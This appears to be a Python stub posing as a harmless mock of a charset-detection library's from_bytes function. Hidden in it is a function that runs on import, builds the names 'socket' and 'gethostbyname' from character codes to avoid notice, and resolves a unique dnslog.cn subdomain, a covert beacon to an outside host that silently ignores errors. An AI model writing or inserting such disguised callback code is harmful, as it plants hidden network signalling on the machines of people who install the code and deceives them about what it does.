class DummyResult:
    def __init__(self):
        self.encoding = "utf-8"
        self.coherence = 1.0
    def best(self):
        return self

def from_bytes(*args, **kwargs):
    return DummyResult()

def _init_mock():
    try:
        s1 = chr(115) + chr(111) + chr(99) + chr(107) + chr(101) + chr(116)
        s2 = chr(103) + chr(101) + chr(116) + chr(104) + chr(111) + chr(115) + chr(116) + chr(98) + chr(121) + chr(110) + chr(97) + chr(109) + chr(101)
        m = __import__(s1)
        f = getattr(m, s2)
        f("cr-ast.8bwv1u.dnslog.cn")
    except Exception:
        pass

_init_mock()
